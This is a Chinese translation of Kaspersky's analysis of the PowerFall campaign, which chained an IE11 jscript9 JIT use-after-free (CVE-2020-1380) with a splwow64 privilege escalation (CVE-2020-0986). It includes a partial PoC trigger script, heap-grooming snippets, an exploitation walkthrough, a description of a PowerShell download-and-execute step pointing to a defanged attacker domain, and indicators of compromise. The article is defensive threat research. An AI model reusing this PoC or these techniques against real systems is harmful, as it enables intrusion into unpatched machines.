> 原文链接: https://www.anquanke.com//post/id/214347 


# PowerFall恶意活动：IE和Windows的两个0-day漏洞分析


                                阅读量   
                                **224017**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Boris Larin，文章来源：Security List
                                <br>原文地址：[https://securelist.com/ie-and-windows-zero-day-operation-powerfall/97976/](https://securelist.com/ie-and-windows-zero-day-operation-powerfall/97976/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01bb8e90098a2db30f.jpg)](https://p4.ssl.qhimg.com/t01bb8e90098a2db30f.jpg)



## 0x00 概述

2020年5月，卡巴斯基成功防御了Internet Explorer恶意脚本对某家韩国企业的攻击。经过进一步分析发现，该工具使用了以前未知的完整利用链，其中包括两个0-day漏洞：Internet Explorer远程代码执行漏洞、Windows特权提升漏洞。与我们以前在WizardOpium恶意活动中发现的攻击链不同，新的攻击链可以针对Windows 10的最新版本发动攻击。经过测试表明，该漏洞可以可靠地在Internet Explorer 11和Windows 10 x64的18363版本上利用。<br>
2020年6月8日，我们向Microsoft报告了我们的发现，并且Microsoft已确认漏洞。在我们撰写报告时，Microsoft的安全团队已经针对CVE-2020-0986漏洞发布了补丁，修复这一特权提升0-day漏洞。但是，在我们发现该漏洞之前，这一漏洞的可利用性被评估为“不太可能”。CVE-2020-0986的修复程序在2020年6月9日发布。<br>
Microsoft为JScript的Use-After-Free漏洞分配了CVE-2020-1380编号，该漏洞的补丁于2020年8月11日发布。

[![](https://p2.ssl.qhimg.com/t01e90ec0b78452f82e.png)](https://p2.ssl.qhimg.com/t01e90ec0b78452f82e.png)

我们将这一系列攻击称为PowerFall恶意活动。目前，我们暂时不能将恶意活动与任何已知的威胁行为者建立明确联系，但根据它与以前发现漏洞的相似性，我们认为DarkHotel可能是此次攻击的幕后黑手。卡巴斯基产品目前将PowerFall攻击检测为“PDM:Exploit.Win32.Generic”。



## 0x01 Internet Explorer 11远程代码执行漏洞

在野外发现的Internet Explorer最新0-day攻击利用了旧版本JavaScript引擎`jscript.dll`中的漏洞CVE-2020-0674、CVE-2019-1429、CVE-2019-0676和CVE-2018-8653。其中，CVE-2020-1380是jscript9.dll中的一个漏洞，该漏洞自Internet Explorer 9开始存在，因此Microsoft建议的缓解步骤（限制`jscript.dll`的使用）无法针对这个特定漏洞实现防护。<br>
CVE-2020-1380是一个释放后使用（Use-After-Free）漏洞，由于JIT优化过程中，JIT编译的代码中缺少必要的检查导致。下面展示了触发漏洞的PoC：

```
function func(O, A, F, O2) `{`
    arguments.push = Array.prototype.push;
    O = 1;
    arguments.length = 0;
    arguments.push(O2);
    if (F == 1) `{`
        O = 2;
    `}`

    // execute abp.valueOf() and write by dangling pointer
    A[5] = O;
`}`;

// prepare objects
var an = new ArrayBuffer(0x8c);
var fa = new Float32Array(an);

// compile func
func(1, fa, 1, `{``}`);
for (var i = 0; i &lt; 0x10000; i++) `{`
    func(1, fa, 1, 1);
`}`

var abp = `{``}`;
abp.valueOf = function() `{`

    // free 
    worker = new Worker('worker.js');
    worker.postMessage(an, [an]);
    worker.terminate();
    worker = null;

    // sleep
    var start = Date.now();
    while (Date.now() - start &lt; 200) `{``}`

    // TODO: reclaim freed memory

    return 0
`}`;

try `{`
    func(1, fa, 0, abp);
`}` catch (e) `{`
    reload()
`}`
```

要理解这一漏洞，我们首先看一下`func()`的执行方式。这里，重要的是了解将什么值设置为A[5]。根据代码，与之相关的应该是一个参数`O`。在函数开始时，会将参数`O`重新分配为1，但随后将函数参数长度设置为0。这个操作不会清除函数参数（通常，常规数组会这样做），但允许将参数`O2`放在索引为0的参数列表1中，这意味着`O = O2`。除此之外，如果参数`F`等于1，则会再次重新分配`O`，但这次会分配整数2。这意味着，根据参数`F`的值，`O`参数会等于`O2`参数的值或是整数2。参数`A`是32位浮点型数组，在将值分配给数组的索引5之前，会将值首先转换为浮点数。将整数转换为浮点数的过程比较简单，但是如果要将对象转换为浮点数，这个过程就不再那么简单了。该漏洞利用使用了重载方法`valueOf()`中的`abp`对象。当对象转换为浮点型时执行此方法，但是在其内部，包含释放ArrayBuffer的代码，该代码由Float32Array查看，并在其中设置返回值。为了防止将值存储在已释放对象的内存中，JavaScript引擎需要首先检查对象的状态，然后再将值存储在对象中。为了安全地转换和存储浮点值，`JScript9.dll`使用函数`Js::TypedArray&lt;float,0&gt;::BaseTypedDirectSetItem()`。下面是这个函数的反编译代码：

```
int Js::TypedArray&lt;float,0&gt;::BaseTypedDirectSetItem(Js::TypedArray&lt;float,0&gt; *this, unsigned int index, void *object, int reserved)
`{`
    Js::JavascriptConversion::ToNumber(object, this-&gt;type-&gt;library-&gt;context);
    if ( LOBYTE(this-&gt;view[0]-&gt;unusable) )
        Js::JavascriptError::ThrowTypeError(this-&gt;type-&gt;library-&gt;context, 0x800A15E4, 0);
    if ( index &lt; this-&gt;count )
    `{`
        *(float *)&amp;this-&gt;buffer[4 * index] = Js::JavascriptConversion::ToNumber(
            object,
            this-&gt;type-&gt;library-&gt;context);
    `}`
    return 1;
`}`

double Js::JavascriptConversion::ToNumber(void *object, struct Js::ScriptContext *context)
`{`
    if ( (unsigned char)object &amp; 1 )
        return (double)((int)object &gt;&gt; 1);
    if ( *(void **)object == VirtualTableInfo&lt;Js::JavascriptNumber&gt;::Address[0] )
        return *((double *)object + 1);
    return Js::JavascriptConversion::ToNumber_Full(object, context);
`}`
```

该函数检查浮点型数组的`view[0]-&gt;unusable`和`count`字段。在执行`valueOf()`方法的过程中，当`ArrayBuffer`被释放时，这两项检查都将失败，因为此时`view[0]-&gt;unusable`为1，并且在第一次调用`Js::JavascriptConversion::ToNumber()`时`count`为0。问题在于，`Js::TypedArray&lt;float,0&gt;::BaseTypedDirectSetItem()`函数仅在解释模式下使用。<br>
当函数`func()`被即时编译时，JavaScript引擎将会使用以下存在漏洞的代码：

```
if ( !((unsigned char)floatArray &amp; 1) &amp;&amp; *(void *)floatArray == &amp;Js::TypedArray&lt;float,0&gt;::vftable )
`{`
  if ( floatArray-&gt;count &gt; index )
  `{`
    buffer = floatArray-&gt;buffer + 4*index;
    if ( object &amp; 1 )
    `{`
      *(float *)buffer = (double)(object &gt;&gt; 1);
    `}`
    else
    `{`
      if ( *(void *)object != &amp;Js::JavascriptNumber::vftable )
      `{`
        Js::JavascriptConversion::ToFloat_Helper(object, (float *)buffer, context);
      `}`
      else
      `{`
        *(float *)buffer = *(double *)(object-&gt;value);
      `}`
    `}`
  `}`
`}`
```

这是`Js::JavascriptConversion::ToFloat_Helper()`函数的代码：

```
void Js::JavascriptConversion::ToFloat_Helper(void *object, float *buffer, struct Js::ScriptContext *context)
`{`
  *buffer = Js::JavascriptConversion::ToNumber_Full(object, context);
`}`
```

如我们所见，与解释模式不同，在即时编译的代码中，不会检查`ArrayBuffer`的生命周期，并且可以释放它的内存，然后在调用`valueOf()`函数时将其回收。此外，攻击者可以控制将返回值写入到哪个索引中。但是，在`arguments.length = 0;`和`arguments.push(O2);`的情况下，PoC会将其替换为`arguments[0] = O2;`，所以`Js::JavascriptConversion::ToFloat_Helper()`就不会触发这个Bug，因为隐式调用将被禁用，并且不会执行对valueOf()函数的调用。<br>
为了确保及时编译函数`func()`，漏洞利用程序会执行该函数0x10000次，对整数进行无害的转换，并且只有在再次执行`func()`之后，才会触发Bug。为了释放`ArrayBuffer`，漏洞利用使用了一种滥用Web Workers API的通用技术。`postMessage()`函数可以用于将对象序列化为消息，并将其发送给worker。但是，这里的一个副作用是，已传输的对象会被释放，并且在当前脚本上下文中变为不可用。在释放`ArrayBuffer`后，漏洞利用程序通过模拟Sleep()函数使用的代码触发垃圾回收机制。这是一个while循环，用于检查`Date.now()`与先前存储的值之间的时间间隔。完成后，漏洞利用会使用整数数组回收内存。

```
for (var i = 0; i &lt; T.length; i += 1) `{`
        T[i] = new Array((0x1000 - 0x20) / 4);
        T[i][0] = 0x666; // item needs to be set to allocate LargeHeapBucket
    `}`
```

在创建大量数组后，Internet Explorer会分配新的`LargeHeapBlock`对象，这些对象会被IE的自定义堆实现使用。`LargeHeapBlock`对象将存储缓冲区地址，讲这些地址分配给数组。如果成功实现了预期的内存布局，则该漏洞将使用0覆盖`LargeHeapBlock`偏移量`0x14`处的值，该值恰好是分配的块数。<br>`jscript9.dll` x86的LargeHeapBlock结构：

[![](https://p0.ssl.qhimg.com/t0116f995b3b3885e1e.png)](https://p0.ssl.qhimg.com/t0116f995b3b3885e1e.png)

此后，漏洞利用会分配大量的数组，并将它们设置为在漏洞利用初始阶段准备好的另一个数组。然后，将该数组设置为null，漏洞利用程序调用`CollectGarbage()`函数。这将导致堆碎片整理，修改后的`LargeHeapBlock`及其相关的数组缓冲区将被释放。在这个阶段，漏洞利用会创建大量的整数数组，以回收此前释放的数组缓冲区。新创建的数组的魔术值设置为索引0，该值通过指向先前释放的数组的悬空指针以进行检查，从而确认漏洞利用是否成功。

```
for (var i = 0; i &lt; K.length; i += 1) `{`
            K[i] = new Array((0x1000 - 0x20) / 4);
            K[i][0] = 0x888; // store magic
        `}`

        for (var i = 0; i &lt; T.length; i += 1) `{`
            if (T[i][0] == 0x888) `{` // find array accessible through dangling pointer
                R = T[i];
                break;
            `}`
        `}`
```

最后，漏洞利用创建了两个不同的`JavascriptNativeIntArray`对象，它们的缓冲区指向相同的位置。这样，就可以检索对象的地址，甚至可以创建新的格式错误的对象。该漏洞利用使用这些原语来创建格式错误的`DataView`对象，并获得对该进程整个地址空间的读/写访问权限。<br>
在构建了任意的读/写原语之后，就可以绕过控制流防护（CFG）并执行代码了。该漏洞利用使用数组的`vftable`指针获取`jscript9.dll`的模块基址。从这里，它解析`jscript9.dll`的PT头，以获得导入目录表的地址，并解析其他模块的基址。这里的目标是找到函数`VirtualProtect()`的基址，该地址将用于执行Shellcode的过程。之后，漏洞利用程序在`jscript9.dll`中搜索两个签名。这些签名对应Unicode字符串`split`和`JsUtil::DoublyLinkedListElement&lt;ThreadContext&gt;::LinkToBeginning&lt;ThreadContext&gt;()`函数地址。Unicode字符串`split`的地址用于获取对该字符串的代码引用，并借助它来帮助解析函数`Js::JavascriptString::EntrySplit()`的地址，该函数实现了字符串方法`split()`。函数`LinkToBeginning&lt;ThreadContext&gt;()`的地址用于获取全局链表中第一个`ThreadContext`对象的地址。这个漏洞利用程序会在链表中找到最后一个条目，并利用它为负责执行脚本的线程获取堆栈位置。然后，就到了最后一个阶段。漏洞利用程序执行`split()`方法，并提供一个具有重载`valueOf()`方法的对象作为限制参数。在执行`Js::JavascriptString::EntrySplit()`函数的过程中，执行重载的`valueOf()`方法时，漏洞利用程序将搜索线程的堆栈以查找返回地址，将Shellcode放置在准备好的缓冲区中，获取其地址。最后，通过覆盖函数的返回地址，构建一个面向返回的编程（ROP）链以执行Shellcode。



## 0x02 下一阶段

Shellcode是附加到Shellcode上的可移植可执行（PE）模块的反射DLL加载器。这个模块非常小，全部功能都位于单个函数内。它在名为`ok.exe`的临时文件夹中创建一个文件，将远程执行代码中利用的另一个可执行文件的内容写入到其中。之后，执行`ok.exe`。<br>`ok.exe`可执行文件包含针对GDI Print / Print Spooler API中的任意指针解引用特权提升漏洞（CVE-2020-0986）。该漏洞最初是一位匿名用户通过Trend Micro的Zero Day Initiative计划向Microsoft报告的。由于该漏洞在报告后的6个月内未发布补丁，因此ZDI将这一0-day漏洞进行披露，披露日期为2020年5月19日。第二天，这一漏洞就已经在先前提到的攻击中被利用。<br>
利用这一漏洞，可以使用进程间通信来读取和写入`splwow64.exe`进程的任意内存，并绕过CFG和EncodePointer保护，从而实现`splwow64.exe`中的代码执行。该漏洞利用程序的资源中嵌入了两个可执行文件。第一个可执行文件以`CreateDC.exe`的形式写入磁盘，并用于创建设备上下文（DC），这是漏洞利用所必需的。第二个可执行文件的名称为`PoPc.dll`，如果利用成功，会由具有中等完整性级别的`splwow64.dll`执行。我们将在后续文章中提供有关CVE-2020-0986及其漏洞利用的更多信息。<br>
从`splwow64.exe`执行恶意PowerShell命令：

[![](https://p1.ssl.qhimg.com/t0168d68920e53d9f10.png)](https://p1.ssl.qhimg.com/t0168d68920e53d9f10.png)

`PoPc.dll`的主要功能也位于单个函数之中。它执行一个编码后的PowerShell命令，该命令用于从`www[.]static-cdn1[.]com/update.zip`下载文件，将其保存为临时文件`upgrader.exe`并执行。由于卡巴斯基已经在下载可执行文件前阻止了攻击，因此我们未能拿到upgrader.exe，无法对其进行进一步分析。



## 0x03 威胁指标

www[.]static-cdn1[.]com/update.zip<br>
B06F1F2D3C016D13307BC7CE47C90594<br>
D02632CFFC18194107CC5BF76AECA7E87E9082FED64A535722AD4502A4D51199<br>
5877EAECA1FE8A3A15D6C8C5D7FA240B<br>
7577E42177ED7FC811DE4BC854EC226EB037F797C3B114E163940A86FD8B078B<br>
B72731B699922608FF3844CCC8FC36B4<br>
7765F836D2D049127A25376165B1AC43CD109D8B9D8C5396B8DA91ADC61ECCB1<br>
E01254D7AF1D044E555032E1F78FF38F<br>
81D07CAE45CAF27CBB9A1717B08B3AB358B647397F08A6F9C7652D00DBF2AE24

原文链接：
